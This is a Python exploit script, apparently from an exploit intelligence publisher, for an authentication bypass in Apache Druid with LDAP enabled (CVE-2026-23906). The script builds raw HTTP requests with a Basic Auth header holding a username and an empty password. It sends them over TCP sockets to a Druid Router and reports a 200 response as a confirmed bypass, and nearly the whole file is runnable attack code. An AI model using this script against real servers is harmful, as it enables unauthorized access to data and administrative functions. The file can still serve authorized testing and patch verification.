#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Druid LDAP Auth Bypass - Raw HTTP Socket Exploit
# CVE            : CVE-2026-23906
# Vendor         : Apache Software Foundation
# Product        : Apache Druid
# Affected       : 0.17.0 through 35.x (prior to 36.0.0)
# Type           : CWE-287 - Improper Authentication
# CVSS           : 9.8 (Critical)
# Platform       : Multiple
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Raw HTTP Socket Exploit — No Library Dependencies (Vector 4)

Demonstrates CVE-2026-23906 using only raw TCP sockets, confirming
the vulnerability at the protocol level with the exact bytes on the wire.

ATTACK CHAIN:
  1. Build raw HTTP request with Basic Auth: base64("admin:") = "YWRtaW46"
  2. Send via TCP socket to Druid Router
  3. Server returns 200 OK — authentication bypassed

PREREQUISITES:
  - Apache Druid 0.17.0 - 35.x with LDAP authentication enabled
  - LDAP server that permits anonymous binds

REFERENCES:
  - CVE-2026-23906
  - RFC 4513 Section 5.1.2 (Unauthenticated Bind)
"""

import sys
import socket
import base64


RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8888


def raw_http_request(host, port, path, username, password="", timeout=15):
    """
    Send a raw HTTP request using TCP sockets.
    Returns (status_code, status_text, headers_raw, body).
    """
    # Build the Authorization header manually
    cred_string = f"{username}:{password}"
    cred_bytes = cred_string.encode("utf-8")
    auth_b64 = base64.b64encode(cred_bytes).decode("ascii")

    # Construct raw HTTP request
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Authorization: Basic {auth_b64}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)

    try:
        sock.connect((host, port))
        sock.sendall(request.encode("utf-8"))

        # Read response
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break

        sock.close()

        # Parse response
        response_str = response.decode("utf-8", errors="replace")
        header_end = response_str.find("\r\n\r\n")
        if header_end == -1:
            return 0, "Malformed", "", response_str

        header_section = response_str[:header_end]
        body = response_str[header_end + 4:]

        # Parse status line
        status_line = header_section.split("\r\n")[0]
        parts = status_line.split(" ", 2)
        if len(parts) >= 2:
            status_code = int(parts[1])
            status_text = parts[2] if len(parts) > 2 else ""
        else:
            status_code = 0
            status_text = "Unknown"

        return status_code, status_text, header_section, body

    except Exception as e:
        sock.close()
        raise


def exploit_raw(host, port, username="admin"):
    """Run the raw socket exploit."""
    print(f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════════════╗
║  CVE-2026-23906 — Vector 4: Raw HTTP Socket Exploit            ║
╚══════════════════════════════════════════════════════════════════╝{RESET}

{CYAN}Attack:{RESET}  Raw TCP socket HTTP request with empty password
{CYAN}Target:{RESET}  {host}:{port}
{CYAN}User:{RESET}    {username}
""")

    # Show the exact base64 encoding
    exploit_creds = f"{username}:"
    exploit_b64 = base64.b64encode(exploit_creds.encode()).decode()
    print(f"{BOLD}Credential string:{RESET} {repr(exploit_creds)}")
    print(f"{BOLD}Base64 encoding:{RESET}  {exploit_b64}")
    print(f"{BOLD}Decoded back:{RESET}     {base64.b64decode(exploit_b64).decode()}")
    print()

    # Test 1: Valid auth via raw socket
    print(f"{BOLD}[Test 1]{RESET} Raw socket — valid credentials ({username}:priest)...")
    try:
        status, text, headers, body = raw_http_request(host, port, "/status",
                                                        username, "priest")
        print(f"  Status: HTTP {status} {text}")
        if status == 200:
            print(f"  {GREEN}✓{RESET} Valid auth works via raw socket")
        else:
            print(f"  {RED}✗{RESET} Unexpected status")
    except Exception as e:
        print(f"  {RED}✗{RESET} Error: {e}")

    # Test 2: Wrong password via raw socket
    print(f"\n{BOLD}[Test 2]{RESET} Raw socket — wrong password ({username}:badpassword)...")
    try:
        status, text, headers, body = raw_http_request(host, port, "/status",
                                                        username, "badpassword")
        print(f"  Status: HTTP {status} {text}")
        if status == 401:
            print(f"  {GREEN}✓{RESET} Wrong password correctly rejected")
        else:
            print(f"  {RED}✗{RESET} Unexpected status")
    except Exception as e:
        print(f"  {RED}✗{RESET} Error: {e}")

    # Test 3: THE EXPLOIT — empty password via raw socket
    print(f"\n{BOLD}{RED}[Test 3] EXPLOIT: Raw socket — empty password ({username}:<empty>)...{RESET}")

    # Show the exact raw HTTP request
    raw_request = (
        f"GET /status HTTP/1.1\\r\\n\n"
        f"Host: {host}:{port}\\r\\n\n"
        f"Authorization: Basic {exploit_b64}\\r\\n\n"
        f"Connection: close\\r\\n\n"
        f"\\r\\n"
    )
    print(f"\n  {CYAN}Raw request:{RESET}")
    for line in raw_request.split("\n"):
        print(f"  {CYAN}  {line}{RESET}")
    print()

    try:
        status, text, headers, body = raw_http_request(host, port, "/status",
                                                        username, "")
        print(f"  Status: HTTP {status} {text}")

        if status == 200:
            print(f"\n  {GREEN}{BOLD}✓ AUTHENTICATION BYPASS CONFIRMED via raw socket!{RESET}")
            print(f"  {GREEN}  Server accepted empty password for user '{username}'{RESET}")

            # Show response body snippet
            if body:
                print(f"\n  {CYAN}Response body (first 300 chars):{RESET}")
                print(f"  {CYAN}{body[:300]}{RESET}")

            return True
        elif status == 401:
            print(f"\n  {RED}✗ Authentication rejected — target may be patched{RESET}")
            return False
        else:
            print(f"\n  {YELLOW}⚠ Unexpected status code{RESET}")
            return False

    except Exception as e:
        print(f"  {RED}✗{RESET} Error: {e}")
        return False


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    username = sys.argv[3] if len(sys.argv) > 3 else "admin"

    success = exploit_raw(host, port, username)
    sys.exit(0 if success else 1)
